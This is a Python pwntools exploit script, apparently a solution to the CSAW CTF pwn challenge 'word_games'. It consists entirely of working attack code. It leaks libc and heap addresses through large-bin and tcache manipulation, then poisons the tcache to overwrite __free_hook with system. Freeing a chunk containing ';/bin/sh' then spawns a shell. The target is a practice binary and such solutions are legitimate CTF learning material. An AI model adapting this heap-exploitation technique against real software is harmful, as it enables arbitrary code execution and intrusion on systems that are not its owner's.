from pwn import *
import sys

libc = ELF("libc-2.33.so")
elf = ELF("./word_games_patched")

if sys.argv[1] == "r":
	p = remote("pwn.chal.csaw.io", 5001)
elif sys.argv[1] == "l":
	p = process("./word_games_patched", env={"LD_PRELOAD":"libc-2.33.so"})
	context.terminal = ["tmux", "splitw", "-h"]
	gdb.attach(p, gdbscript='''
							continue
							''')
def defu(p):
	d = 0
	for i in range(0x100,0,-4):
		pa = (p & (0xf << i )) >> i
		pb = (d & (0xf << i+12 )) >> i+12
		d |= (pa ^ pb) << i
	return d

def suggest(size, data):
	p.sendlineafter("> ", "1")
	p.sendlineafter("word? > ", str(size))
	p.sendafter("word? > ", data)

def scrap():
	p.sendlineafter("> ", "2")

def show():
    p.sendlineafter("> ", "3")

def solve():
    # fill tcache 0xa0, the last go to large bin
    for i in range(8):
        suggest(0x90, "a"*0x90)
    # one chunk to large bin
    suggest(0x500, "a")
    scrap()

    # emtpy tcache 0xa0
    for i in range(7):
        suggest(0x90, "a"*0x90)

    # leak libc using large bin
    suggest(0x8, "a"*8)
    suggest(0x20, "funAAAAAA")
    show()
    p.recvuntil("far is: funAAAAAA")
    libc_leak = u64(p.recv(5) + "\x00"*3) << 8 
    libc.address = libc_leak - 0x1c0a00
    free_hook = libc.symbols["__free_hook"]
    system = libc.symbols["system"]
    success("libc leak: %s"%hex(libc_leak))
    success("libc base: %s"%hex(libc.address))
    success("__free_hook: %s"%hex(free_hook))
    success("system: %s"%hex(system))
    
    scrap()

    for i in range(4):
        suggest(0x3, "aaa")
    suggest(0x10, "fun"+"B"*13)
    show()
    p.recvuntil("far is: fun" + "B"*13)
    heap_base = u64(p.recv(6) + "\x00"*2) - 0x530
    success("heap base: %s"%hex(heap_base))
    suggest(0x90, "fun"+"B"*16)

    for i in range(4):
        suggest(0x90, "aa")
    suggest(0x20, "fun" + "B"*17 + ";/bin/sh\x00")
    suggest(0x280, "A"*8*16 + p64(heap_base) + p64(free_hook)*10)

    suggest(0x90, p64(system))
    # p.interactive()

    scrap() 
    p.interactive()


if __name__ == "__main__":
	solve()